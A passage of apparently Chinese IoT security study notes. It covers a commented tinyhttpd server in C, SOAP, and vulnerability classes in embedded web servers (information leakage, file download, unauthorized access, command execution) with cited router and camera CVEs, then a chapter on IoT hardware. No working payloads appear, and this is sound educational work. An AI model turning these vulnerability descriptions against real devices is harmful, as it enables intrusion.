class="line"><span class="string"> send(client, buf, strlen(buf), 0);</span></span><br><span class="line"><span class="string"> sprintf(buf, SERVER_STRING);</span></span><br><span class="line"><span class="string"> send(client, buf, strlen(buf), 0);</span></span><br><span class="line"><span class="string"> sprintf(buf, &quot;Content-Type: text/htmlrn&quot;);</span></span><br><span class="line"><span class="string"> send(client, buf, strlen(buf), 0);</span></span><br><span class="line"><span class="string"> sprintf(buf, &quot;rn&quot;);</span></span><br><span class="line"><span class="string"> send(client, buf, strlen(buf), 0);</span></span><br><span class="line"><span class="string"> sprintf(buf, &quot;&lt;HTML&gt;&lt;TITLE&gt;Not Found&lt;/TITLE&gt;rn&quot;);</span></span><br><span class="line"><span class="string"> send(client, buf, strlen(buf), 0);</span></span><br><span class="line"><span class="string"> sprintf(buf, &quot;&lt;BODY&gt;&lt;P&gt;The server could not fulfillrn&quot;);</span></span><br><span class="line"><span class="string"> send(client, buf, strlen(buf), 0);</span></span><br><span class="line"><span class="string"> sprintf(buf, &quot;your request because the resource specifiedrn&quot;);</span></span><br><span class="line"><span class="string"> send(client, buf, strlen(buf), 0);</span></span><br><span class="line"><span class="string"> sprintf(buf, &quot;is unavailable or nonexistent.rn&quot;);</span></span><br><span class="line"><span class="string"> send(client, buf, strlen(buf), 0);</span></span><br><span class="line"><span class="string"> sprintf(buf, &quot;&lt;/BODY&gt;&lt;/HTML&gt;rn&quot;);</span></span><br><span class="line"><span class="string"> send(client, buf, strlen(buf), 0);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">/**********************************************************************/</span></span><br><span class="line"><span class="string">/* Send a regular file to the client.  Use headers, and report</span></span><br><span class="line"><span class="string"> * errors to client if they occur.</span></span><br><span class="line"><span class="string"> * Parameters: a pointer to a file structure produced from the socket</span></span><br><span class="line"><span class="string"> *              file descriptor</span></span><br><span class="line"><span class="string"> *             the name of the file to serve */</span></span><br><span class="line"><span class="string">/**********************************************************************/</span></span><br><span class="line"><span class="string">//将请求的文件发送回浏览器客户端</span></span><br><span class="line"><span class="string">void serve_file(int client, const char *filename)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"> FILE *resource = NULL;</span></span><br><span class="line"><span class="string"> int numchars = 1;</span></span><br><span class="line"><span class="string"> char buf[1024];</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> buf[0] = &#x27;</span>A<span class="number">&#x27;</span>; buf[<span class="number">1</span>] = <span class="string">&#x27;&#x27;;//这个赋值不清楚是干什么的</span></span><br><span class="line"><span class="string"> while ((numchars &gt; 0) &amp;&amp; strcmp(&quot;n&quot;, buf)) //将HTTP请求头读取并丢弃</span></span><br><span class="line"><span class="string">  numchars = get_line(client, buf, sizeof(buf));</span></span><br><span class="line"><span class="string">//打开文件</span></span><br><span class="line"><span class="string"> resource = fopen(filename, &quot;r&quot;);</span></span><br><span class="line"><span class="string"> if (resource == NULL)</span></span><br><span class="line"><span class="string"> //如果文件不存在，则返回not_found</span></span><br><span class="line"><span class="string">  not_found(client);</span></span><br><span class="line"><span class="string"> else</span></span><br><span class="line"><span class="string"> &#123;</span></span><br><span class="line"><span class="string"> //添加HTTP头</span></span><br><span class="line"><span class="string">  headers(client, filename);</span></span><br><span class="line"><span class="string"> //并发送文件内容</span></span><br><span class="line"><span class="string">  cat(client, resource);</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string"> fclose(resource);//关闭文件句柄</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">/**********************************************************************/</span></span><br><span class="line"><span class="string">/* This function starts the process of listening for web connections</span></span><br><span class="line"><span class="string"> * on a specified port.  If the port is 0, then dynamically allocate a</span></span><br><span class="line"><span class="string"> * port and modify the original port variable to reflect the actual</span></span><br><span class="line"><span class="string"> * port.</span></span><br><span class="line"><span class="string"> * Parameters: pointer to variable containing the port to connect on</span></span><br><span class="line"><span class="string"> * Returns: the socket */</span></span><br><span class="line"><span class="string">/**********************************************************************/</span></span><br><span class="line"><span class="string">//启动服务端</span></span><br><span class="line"><span class="string">int startup(u_short *port)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"> int httpd = 0;</span></span><br><span class="line"><span class="string"> struct sockaddr_in name;</span></span><br><span class="line"><span class="string">//设置http socket</span></span><br><span class="line"><span class="string"> httpd = socket(PF_INET, SOCK_STREAM, 0);</span></span><br><span class="line"><span class="string"> if (httpd == -1)</span></span><br><span class="line"><span class="string">  error_die(&quot;socket&quot;);</span></span><br><span class="line"><span class="string"> memset(&amp;name, 0, sizeof(name));</span></span><br><span class="line"><span class="string"> name.sin_family = AF_INET;</span></span><br><span class="line"><span class="string"> name.sin_port = htons(*port);</span></span><br><span class="line"><span class="string"> name.sin_addr.s_addr = htonl(INADDR_ANY);</span></span><br><span class="line"><span class="string"> //绑定端口</span></span><br><span class="line"><span class="string"> if (bind(httpd, (struct sockaddr *)&amp;name, sizeof(name)) &lt; 0)</span></span><br><span class="line"><span class="string">  error_die(&quot;bind&quot;);</span></span><br><span class="line"><span class="string"> if (*port == 0)  /*动态分配一个端口 */</span></span><br><span class="line"><span class="string"> &#123;</span></span><br><span class="line"><span class="string">  int namelen = sizeof(name);</span></span><br><span class="line"><span class="string">  if (getsockname(httpd, (struct sockaddr *)&amp;name, &amp;namelen) == -1)</span></span><br><span class="line"><span class="string">   error_die(&quot;getsockname&quot;);</span></span><br><span class="line"><span class="string">  *port = ntohs(name.sin_port);</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string"> //监听连接</span></span><br><span class="line"><span class="string"> if (listen(httpd, 5) &lt; 0)</span></span><br><span class="line"><span class="string">  error_die(&quot;listen&quot;);</span></span><br><span class="line"><span class="string"> return(httpd);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">/**********************************************************************/</span></span><br><span class="line"><span class="string">/* Inform the client that the requested web method has not been</span></span><br><span class="line"><span class="string"> * implemented.</span></span><br><span class="line"><span class="string"> * Parameter: the client socket */</span></span><br><span class="line"><span class="string">/**********************************************************************/</span></span><br><span class="line"><span class="string">void unimplemented(int client)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"> char buf[1024];</span></span><br><span class="line"><span class="string">//发送501说明相应方法没有实现</span></span><br><span class="line"><span class="string"> sprintf(buf, &quot;HTTP/1.0 501 Method Not Implementedrn&quot;);</span></span><br><span class="line"><span class="string"> send(client, buf, strlen(buf), 0);</span></span><br><span class="line"><span class="string"> sprintf(buf, SERVER_STRING);</span></span><br><span class="line"><span class="string"> send(client, buf, strlen(buf), 0);</span></span><br><span class="line"><span class="string"> sprintf(buf, &quot;Content-Type: text/htmlrn&quot;);</span></span><br><span class="line"><span class="string"> send(client, buf, strlen(buf), 0);</span></span><br><span class="line"><span class="string"> sprintf(buf, &quot;rn&quot;);</span></span><br><span class="line"><span class="string"> send(client, buf, strlen(buf), 0);</span></span><br><span class="line"><span class="string"> sprintf(buf, &quot;&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;Method Not Implementedrn&quot;);</span></span><br><span class="line"><span class="string"> send(client, buf, strlen(buf), 0);</span></span><br><span class="line"><span class="string"> sprintf(buf, &quot;&lt;/TITLE&gt;&lt;/HEAD&gt;rn&quot;);</span></span><br><span class="line"><span class="string"> send(client, buf, strlen(buf), 0);</span></span><br><span class="line"><span class="string"> sprintf(buf, &quot;&lt;BODY&gt;&lt;P&gt;HTTP request method not supported.rn&quot;);</span></span><br><span class="line"><span class="string"> send(client, buf, strlen(buf), 0);</span></span><br><span class="line"><span class="string"> sprintf(buf, &quot;&lt;/BODY&gt;&lt;/HTML&gt;rn&quot;);</span></span><br><span class="line"><span class="string"> send(client, buf, strlen(buf), 0);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">/**********************************************************************/</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">int main(void)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"> int server_sock = -1;</span></span><br><span class="line"><span class="string"> u_short port = 0;</span></span><br><span class="line"><span class="string"> int client_sock = -1;</span></span><br><span class="line"><span class="string"> struct sockaddr_in client_name;</span></span><br><span class="line"><span class="string"> int client_name_len = sizeof(client_name);</span></span><br><span class="line"><span class="string"> pthread_t newthread;</span></span><br><span class="line"><span class="string">//启动server socket</span></span><br><span class="line"><span class="string"> server_sock = startup(&amp;port);</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> printf(&quot;httpd running on port %dn&quot;, port);</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> while (1)</span></span><br><span class="line"><span class="string"> &#123;</span></span><br><span class="line"><span class="string"> //接受客户端连接</span></span><br><span class="line"><span class="string">  client_sock = accept(server_sock,</span></span><br><span class="line"><span class="string">                       (struct sockaddr *)&amp;client_name,</span></span><br><span class="line"><span class="string">                       &amp;client_name_len);</span></span><br><span class="line"><span class="string">  if (client_sock == -1)</span></span><br><span class="line"><span class="string">   error_die(&quot;accept&quot;);</span></span><br><span class="line"><span class="string"> /*启动线程处理新的连接 */</span></span><br><span class="line"><span class="string"> if (pthread_create(&amp;newthread , NULL, accept_request, client_sock) != 0)</span></span><br><span class="line"><span class="string">   perror(&quot;pthread_create&quot;);</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string">//关闭server socket</span></span><br><span class="line"><span class="string"> close(server_sock);</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> return(0);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/tinyhttpd.png" alt="tinyhttpd"></p>
<h2 id="0x03-soap协议讲解"><a href="#0x03-soap协议讲解" class="headerlink" title="0x03 soap协议讲解"></a>0x03 soap协议讲解</h2><p><strong>嵌入式web通信——SOAP</strong></p>
<p>SOAP（Simple Object Accrss Protocol，简单对象访问协议）是一种简单的基于XML的协议，可以使应用程序在分散或分布式的环境中通过HTTP，SMTP等协议来交互信息。</p>
<ul>
<li>XML：一种可扩展标记语言，被设计用来传输和存储数据</li>
<li>XML命名空间：用来避免元素命名冲突</li>
</ul>
<p>eg：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220826170625905.png" alt="image-20220826170625905"></p>
<p>命名空间的定义格式</p>
<p><code>xmlns:前缀标识=“用于标示命名空间的地址”</code></p>
<p>eg：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220826170741042.png" alt="image-20220826170741042"></p>
<p><strong>SOAP组成</strong></p>
<ul>
<li>SOAP消息封装</li>
<li>SOAP编码规则</li>
<li>SOAPRPC表示</li>
<li>SOAP绑定</li>
</ul>
<p><strong>SOAP语法规则</strong></p>
<ul>
<li>SOAP消息必须用XML来编码</li>
<li>SOAP消息必须使用SOAP Envelope命名空间</li>
<li>SOAP消息必须使用SOAP Encoding Style命名空间</li>
<li>SOAP消息不能包含DTD引用</li>
<li>SOAP消息不能包含XML处理指令</li>
</ul>
<p><strong>SOAP消息基本结构</strong></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220826171043430.png" alt="image-20220826171043430"></p>
<p><strong>SOAP报文实例</strong></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220826171128206.png" alt="image-20220826171128206"></p>
<p>请求</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220826171138971.png" alt="image-20220826171138971"></p>
<p>响应</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220826171215281.png" alt="image-20220826171215281"></p>
<h2 id="0x04-常见嵌入式web应用及漏洞分析讲解"><a href="#0x04-常见嵌入式web应用及漏洞分析讲解" class="headerlink" title="0x04 常见嵌入式web应用及漏洞分析讲解"></a>0x04 常见嵌入式web应用及漏洞分析讲解</h2><h3 id="1-常用嵌入式web系统"><a href="#1-常用嵌入式web系统" class="headerlink" title="1. 常用嵌入式web系统"></a>1. 常用嵌入式web系统</h3><ul>
<li>Lighttpd：开源轻量、高性能、安全性、兼容性高、适合静态资源</li>
<li>Goahead：嵌入式实时操作系统，开源跨平台</li>
<li>Shttpd</li>
<li>Thttpd</li>
<li>Boa</li>
<li>Mini_httpd</li>
<li>Appweb</li>
</ul>
<h3 id="2-常见漏洞类型"><a href="#2-常见漏洞类型" class="headerlink" title="2. 常见漏洞类型"></a>2. 常见漏洞类型</h3><h4 id="2-1-信息泄露"><a href="#2-1-信息泄露" class="headerlink" title="2.1 信息泄露"></a>2.1 信息泄露</h4><p><strong>漏洞描述：</strong></p>
<p>敏感信息包括但不限于口令、密钥、证书、会话标识，License，隐私数据，授权凭证，个人数据（如姓名、地址、电话等），在程序文件，配置文件、日志文件、备份文件，固件中都有可能包含敏感信息</p>
<p><strong>检测方法：</strong></p>
<ol>
<li>工具，爬虫等扫描获得敏感信息，敏感文件路径</li>
<li>手工挖掘，根据web同期或网页源代码获得敏感信息</li>
</ol>
<p>使用firmwalker脚本查找敏感文件路径</p>
<p>github项目地址：<a href="https://github.com/craigz28/firmwalker.git">https://github.com/craigz28/firmwalker.git</a></p>
<p><strong>信息泄露案例：</strong>Moxa EDR-810</p>
<p>CVE-2019-10963：未经身份验证的攻击者可以从Web服务器检索所有日志文件</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220826174322172.png" alt="image-20220826174322172"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220826174349251.png" alt="image-20220826174349251"></p>
<h4 id="2-2-任意文件下载"><a href="#2-2-任意文件下载" class="headerlink" title="2.2 任意文件下载"></a>2.2 任意文件下载</h4><p><strong>漏洞描述：</strong></p>
<p>任意文件下载漏洞，正常的利用手段是下载服务器文件，如脚本文件，服务器配置或者是系统配置等等，在能提取固件的情况下能够很好的获得文件路径。</p>
<p><strong>漏洞危害：</strong></p>
<p>下载服务器中任意文件，如脚本代码、服务及系统配置文件等，在这些文件中能获得一些敏感的信息等数据</p>
<p><strong>任意文件下载案例：</strong>GL-AR300M-Lite</p>
<p>CVE-2019-6273：任意文件下载</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220826174717746.png" alt="image-20220826174717746"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220826174730539.png" alt="image-20220826174730539"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220826174804976.png" alt="image-20220826174804976"></p>
<h4 id="2-3-未授权访问"><a href="#2-3-未授权访问" class="headerlink" title="2.3 未授权访问"></a>2.3 未授权访问</h4><p><strong>漏洞描述：</strong></p>
<p>服务器未授权访问可以理解为需要安全配置或权限认证的地址、授权页面存在缺陷，导致其他用户可以直接访问，从而引发重要权限可被操作、网站目录等敏感信息泄露</p>
<p><strong>漏洞危害：</strong></p>
<p>未授权访问能引发重要权限可被操作、任意用户登录、网站目录、用户密码等敏感信息泄露</p>
<p><strong>未授权访问案例：</strong>Geovision Inc IP 摄像头</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220826175058817.png" alt="image-20220826175058817"></p>
<h4 id="2-4-命令执行"><a href="#2-4-命令执行" class="headerlink" title="2.4 命令执行"></a>2.4 命令执行</h4><p><strong>漏洞原理：</strong></p>
<p>命令执行漏洞介绍当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数</p>
<p><strong>漏洞危害：</strong></p>
<p>根据不同用户权限，能执行任意命令，造成的后果十分严重，稍加利用就能获得shell</p>
<p><strong>命令执行案例：</strong>D-Link DIR-823G</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220826175327065.png" alt="image-20220826175327065"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220826175338621.png" alt="image-20220826175338621"></p>
]]></content>
      <categories>
        <category>IoT安全入门</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>IoT安全入门03</title>
    <url>/2023/03/28/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/IoT%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A803/</url>
    <content><![CDATA[<h1 id="第三章-物联网硬件层安全讲解"><a href="#第三章-物联网硬件层安全讲解" class="headerlink" title="第三章 物联网硬件层安全讲解"></a>第三章 物联网硬件层安全讲解</h1><h2 id="0x01-物联网硬件层安全讲解"><a href="#0x01-物联网硬件层安全讲解" class="headerlink" title="0x01 物联网硬件层安全讲解"></a>0x01 物联网硬件层安全讲解</h2><h3 id="1-硬件简介"><a href="#1-硬件简介" class="headerlink" title="1. 硬件简介"></a>1. 硬件简介</h3><h4 id="1-1-物联网硬件"><a href="#1-1-物联网硬件" class="headerlink" title="1.1 物联网硬件"></a>1.1 物联网硬件</h4><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220819135935930.png" alt="image-20220819135935930" style="zoom: 50%;" />

<img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220819140008430.png" alt="image-20220819140008430" style="zoom: 50%;" />

<span id="more"></span>

<h4 id="1-2-物联网硬件组成"><a href="#1-2-物联网硬件组成" class="headerlink" title="1.2 物联网硬件组成"></a>1.2 物联网硬件组成</h4><ol>
<li><p>印刷电路板</p>
</li>
<li><p><strong>存储芯片</strong>可分为</p>
<ul>
<li>ROM芯片（PROM，EPROM，EEPROM，FLASH-ROM）</li>
<li>RAM芯片（静态RAM，动态RAM）</li>
<li>Flash芯片（SPI&#x2F;NAND&#x2F;eMMC）</li>
</ul>
</li>
<li><p>电子元器</p>
<p>二极管、三极管、电阻、电解电容、贴片电容、贴片电阻</p>
</li>
<li><p><strong>调试接口</strong></p>
<p>UART、JTAG、I2C、SPI等</p>
</li>
<li><p>模块</p>
<p>蓝牙模块、WiFi模块等</p>
</li>
</ol>
<h3 id="2-硬件模块详解"><a href="#2-硬件模块详解" class="headerlink" title="2. 硬件模块详解"></a>2. 硬件模块详解</h3><h4 id="2-1-印刷电路版"><a href="#2-1-印刷电路版" class="headerlink" title="2.1 印刷电路版"></a>2.1 印刷电路版</h4><p>印制电路板（PCB线路板），又称印刷电路板，是电子元器件电气连接的提供者。它的设计主要是版图设计；采用电路板的主要优点是大大减少布线和装配的差错,提高了自动化水平和生产劳动率。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220819140631882.png" alt="image-20220819140631882"></p>
<p><strong>印刷电路板的组成</strong></p>
<ul>
<li>线路与图面（Pattern）：线路是作为原件之间导通的工具，在设计上会另外设计大铜面作为接地及电源层。线路与图面是同时做出的。</li>
<li>介电层（Dielectric）：用来保持线路及各层之间的绝缘性，俗称为基材。</li>
<li>孔（Through hole &#x2F; via）：导通孔可使两层次以上的线路彼此导通，较大的导通孔则做为零件插件用，另外有非导通孔(nPTH)通常用来作为表面贴装定位，组装时固定螺丝用。</li>
<li>防焊油墨（Solder resistant &#x2F; Solder Mask）：并非全部的铜面都要吃锡上零件，因此非吃锡的区域，会印一层隔绝铜面吃锡的物质（通常为环氧树脂），避免非吃锡的线路间短路。根据不同的工艺，分为绿油、红油、蓝油。</li>
<li>丝印（Legend &#x2F;Marking&#x2F;Silk screen）：此为非必要之构成，主要的功能是在电路板上标注各零件的名称、位置框，方便组装后维修及辨识用。</li>
<li>表面处理（Surface Finish）：由于铜面在一般环境中，很容易氧化，导致无法上锡（焊锡性不良），因此会在要吃锡的铜面上进行保护。保护的方式有喷锡（HASL），化金（ENIG），化银（ImmersionSilver），化锡（ImmersionTIn），有机保焊剂（OSP）方法各有优缺点，统称为表面处理。</li>
</ul>
<p><strong>印刷电路板的分类</strong></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220819141223542.png" alt="image-20220819141223542"></p>
<h4 id="2-2-存储芯片"><a href="#2-2-存储芯片" class="headerlink" title="2.2 存储芯片"></a>2.2 存储芯片</h4><p><strong>ROM</strong></p>
<p>ROM全称Read Only Menory ，顾名思义，它是一种只能读出事先所存的数据的固态半导体存储器。ROM中所存数据稳定，一旦存储数据就再也无法将之改变或者删除，断电后所存数据也不会消失。其结构简单，因而常用于存储各种固化程序和数据。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220819141516013.png" alt="image-20220819141516013"></p>
<p><strong>RAM</strong></p>
<p>RAM又称随机存取存储器，存储单元的内容可按照需要随机取出或存入，且存取的速度与存储单元的位置无关。这种存储器在断电时，将丢失其存储内容，所以主要用于存储短时间使用的程序。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220819141624457.png" alt="image-20220819141624457"></p>
<p><strong>Flash</strong></p>
<p>Flash存储器（FLASH EEPROM）又称闪存，快闪。它是EEPROM的一 种。它结合了ROM和RAM的长处。不仅具备电子可擦除可编辑（ EEPROM）的性能，还不会断电丢失数据同时可以快速读取数据。它于EEPROM的最大区别是，FLASH按扇区（block）操作，而EEPROM按照字节操作。FLASH的电 路结构较简单，同样容量占芯片面积较小，成本自然比EEPROM低，因此适合用于做程序存储器。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220819141856670.png" alt="image-20220819141856670"></p>
<h5 id="2-2-1-ROM的种类"><a href="#2-2-1-ROM的种类" class="headerlink" title="2.2.1 ROM的种类"></a>2.2.1 ROM的种类</h5><p>ROM（不可擦写）；PROM、EPROM、EEPROM、快闪存储器（Flash Memory）（可擦写）</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220819142109684.png" alt="image-20220819142109684"></p>
<p>ROM芯片示例</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220819142233832.png" alt="image-20220819142233832"></p>
<h5 id="2-2-2-RAM的种类"><a href="#2-2-2-RAM的种类" class="headerlink" title="2.2.2 RAM的种类"></a>2.2.2 RAM的种类</h5><ul>
<li>静态随机存储器SRAM：<br>以触发器为基本存储单元，所以只要不掉电，其所存信息就不会丢失。该类芯片的集成度不如DRAM，功耗也比DRAM高，但它的速度比DRAM快，也不需要刷新电路。一般用于构成高速缓冲存储器</li>
<li>动态随机存储器DRAM：<br>一般用MOS型动态存储单元构成，结构简单，集成度高。但是，如果不及时进行刷新,极间电容中的电荷会在很短时间内自然泄<br>漏，致使信息丢失。所以，必须为它配备专门门的刷新电路。</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220819142514956.png" alt="image-20220819142514956"></p>
<p>RAM芯片示例</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220819142704029.png" alt="image-20220819142704029"></p>
<h5 id="2-2-3-Flash种类"><a href="#2-2-3-Flash种类" class="headerlink" title="2.2.3 Flash种类"></a>2.2.3 Flash种类</h5><ul>
<li><p>NOR Flash</p>
<ul>
<li>CFI Flash</li>
<li>SPI Flash</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220819142945193.png" alt="image-20220819142945193"></p>
</li>
<li><p>NAND Flash</p>
<ul>
<li>MLC Flash</li>
<li>SLC Flash</li>
<li>TLC Flash</li>
<li>TFNAND</li>
<li><strong>EMMC</strong></li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220819142953801.png" alt="image-20220819142953801"></p>
</li>
</ul>
<h6 id="NOR-Flash"><a href="#NOR-Flash" class="headerlink" title="NOR Flash"></a>NOR Flash</h6><p>NOR Flash的读取和我们常见的SDRAM 的读取是类似，用户可以直接运行装载在NOR FLASH 里面的代码，这样可以减少SRAM的容量从而节约成本。NOR的特点是芯片内执行（ XIP，eXecute In Place ），这样应用程序可以直接在flash闪存内运行，不必再把代码读到系统RAM中。NOR的传输效率很高，在1~4MB的小容量时具有很高的成本效益，但是其很低的写入和擦除速度大大影响了它的性能。<br>NOR flash分为串行传输和并行传输。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220819143213426.png" alt="image-20220819143213426"></p>
<p>NOR Flash和CPU的接口属于典型的类SRAM接口，不需要增加额外的控制电路。NOR Flash的特点是可芯片内执行（eXecute In Place，XIP ），程序可以直接在NOR内运行</p>
<p><strong>CFI</strong></p>
<p>公共闪存接口（ Common Flash Interface ，CFI ）是一个从NOR Flash器件中读取数据的公开、标准接口。它可以使系统软件查询已安装的Flash器件的各种参数，包括器件阵列结构参数、电气和时间参数以及器件支持的功能等</p>
<p>CFI接口，也被称为parallel接口，并行接口；另外，CFI接口是JEDEC定义的，所以，有的又成CFI接口为JEDEC接口。</p>
<p>简单理解为：对于Nor Flash来说，CFI接口&#x3D;JEDEC接口&#x3D;Paralle1接口&#x3D;并行接口</p>
<p><strong>SPI Flash</strong></p>
<p>SPI Flash : serial peripheral interface串行外围设备接口，是一种常见的时钟同步串行通信接口。有4线（时钟，两个数据线，片选线）或者3线（时钟，两个数据线）通信接口，由于它有两个数据线能实现全双工通信，读写速度上较快。拥有独立的数据总线和地址总线，能快速随机读取，允许系统直接从Flash中读取代码执行；可以单字节或单字编程，但不能单字节擦除，必须以Sector为单位或对整片执行擦除操作，在对存储器进行重新编程之前需要对Sector或整片进行预编程和擦除操作。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220819143642974.png" alt="image-20220819143642974"></p>
<h6 id="NAND-Flash"><a href="#NAND-Flash" class="headerlink" title="NAND Flash"></a>NAND Flash</h6><ul>
<li>SLC Single-Level Cell，意味着每个存储单元只存放1bit讯息，靠浮置闸里电子捕获状态的有或无来输出成数据（即使在0的状态浮置闸里其实还是有电子，但不多），也就是最简单的0与1</li>
<li>MLC Multi-Level Cell ，意味着每个存储单元可存放2bit讯息，浮置闸里电子的量会分为高、中、低与无四种状态，转换为二进制后变成00、01、 10、 11</li>
<li>TLC Triple-Level Cell ，更进一步将浮置闸里的电子捕获状态分成八种，换算成二进制的000、 001、 010、 011、 100、 101、110、 111 ，也就是3bit</li>
</ul>
<p><strong>NAND Flash接口</strong></p>
<ul>
<li>I&#x2F;0总线:地址、指令和数据通过这组总线传输，一般为8位或16位。</li>
<li>芯片启动( Chip Enable ， CE# ) : 如果没有检测到CE信号，NAND器件就保持待机模式，不对任何控制信号做出响应。</li>
<li>写使能( Write Enable ，WE# ) : WE#负责将数据、地址或指令写入NAND之中。</li>
<li>读使能(ReadEnable，RE#):RE#允许数据输出。</li>
<li>指令锁存使能( Command Latch Enable ， CLE ) :当CLE为高电平时，在WE#信号的上升沿，指令将被锁存到NAND指令寄存器中。</li>
<li>地址锁存使能( Address Latch Enable ， ALE ) :当ALE为高电平时，在WE#信号的上升沿，地址将被锁存到NAND地址寄存器中。</li>
<li>就绪&#x2F;忙( Ready&#x2F;Busy ， R&#x2F;B# ) : 如果NAND器件忙， R&#x2F;B#信号将变为低电平。该信号是漏极开路，需要采用上拉电阻。</li>
</ul>
<p><strong>SLC&#x2F;MLC&#x2F;TLC比较</strong></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220819144328389.png" alt="image-20220819144328389"></p>
<p><strong>EMMC</strong></p>
<p>EMMC是embedded MultiMediaCard的简称。 MultiMediaCard，即MMC，是一种闪存卡(Flash Memory Card)标准，它定义了MMC的架构以及访问Flash Memory的接口和协议。而eMMC则是对MMC的一个拓展，以满足更高标准的性能、成本、体积、稳定、易用等的需求。</p>
<p>EMMC内部分为：Flash Memory、Flash Controller、Host Interface</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220819144616752.png" alt="image-20220819144616752"></p>
<p><strong>EMMC-Flash Memory</strong></p>
<p>Flash Memory是一种非易失性的存储器，通常在嵌入式系统中用于存放系统、应用和数据等，类似与PC系统中的硬盘。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220819144739700.png" alt="image-20220819144739700"></p>
<p><strong>EMMC-Flash Controller</strong></p>
<p>NAND Flash直接接入Host时，Host端通常需要有NAND Flash Translation Layer，即NFTL或者NAND Flash文件 系统来做坏块管<br>理、ECC等的功能。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220819144854540.png" alt="image-20220819144854540"></p>
<p><strong>EMMC-Host Interface</strong></p>
<p>eMMC与Host之间的连接如下图所示：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220819144953386.png" alt="image-20220819144953386"></p>
<h5 id="2-2-4-芯片识别网站"><a href="#2-2-4-芯片识别网站" class="headerlink" title="2.2.4 芯片识别网站"></a>2.2.4 芯片识别网站</h5><ol>
<li><a href="https://www.21icsearch.com/">https://www.21icsearch.com</a></li>
<li><a href="https://www.datasheets.com/zh-cn">https://www.datasheets.com/zh-cn</a></li>
<li><a href="https://www.datasheetlocator.com/zh-cn">https://www.datasheetlocator.com/zh-cn</a></li>
<li><a href="https://www.datasheet-pdf.com/">https://www.datasheet-pdf.com</a></li>
